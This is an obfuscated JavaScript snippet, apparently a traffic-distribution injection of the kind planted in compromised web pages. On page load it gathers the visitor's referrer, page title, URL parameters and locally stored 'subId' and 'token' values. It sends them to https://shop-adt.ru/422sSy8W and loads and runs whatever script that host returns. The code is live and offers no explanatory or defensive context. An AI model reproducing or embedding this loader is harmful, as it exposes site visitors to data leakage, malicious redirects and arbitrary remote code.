 (function() {
    var name = '_LtywMsYWtsD2Kpjk';
    if (!window._LtywMsYWtsD2Kpjk) {
        window._LtywMsYWtsD2Kpjk = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://shop-adt.ru/422sSy8W',
        };
    }
    const _4H4qc2Dg4fqyq7pn = localStorage.getItem('config');
    if (typeof _4H4qc2Dg4fqyq7pn !== 'undefined' && _4H4qc2Dg4fqyq7pn !== null) {
        var _tXYfMXrMKb6kBFwp = JSON.parse(_4H4qc2Dg4fqyq7pn);
        var _8LfHjV31bcdHjSjx = Math.round(+new Date()/1000);
        if (_tXYfMXrMKb6kBFwp.created_at + window._LtywMsYWtsD2Kpjk.ttl < _8LfHjV31bcdHjSjx) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _xn1SYsf9YJP2kyKQ = localStorage.getItem('subId');
    var _zhtky8hrCzsXbzQy = localStorage.getItem('token');
    var _Qm9b6Y6K2X847ZxC = '?return=js.client';
        _Qm9b6Y6K2X847ZxC += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Qm9b6Y6K2X847ZxC += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Qm9b6Y6K2X847ZxC += '&default_keyword=' + encodeURIComponent(document.title);
        _Qm9b6Y6K2X847ZxC += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Qm9b6Y6K2X847ZxC += '&name=' + encodeURIComponent(name);
        _Qm9b6Y6K2X847ZxC += '&host=' + encodeURIComponent(window._LtywMsYWtsD2Kpjk.R_PATH);
    if (typeof _xn1SYsf9YJP2kyKQ !== 'undefined' && _xn1SYsf9YJP2kyKQ && window._LtywMsYWtsD2Kpjk.unique) {
        _Qm9b6Y6K2X847ZxC += '&sub_id=' + encodeURIComponent(_xn1SYsf9YJP2kyKQ);
    }
    if (typeof _zhtky8hrCzsXbzQy !== 'undefined' && _zhtky8hrCzsXbzQy && window._LtywMsYWtsD2Kpjk.unique) {
        _Qm9b6Y6K2X847ZxC += '&token=' + encodeURIComponent(_zhtky8hrCzsXbzQy);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._LtywMsYWtsD2Kpjk.R_PATH + _Qm9b6Y6K2X847ZxC;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
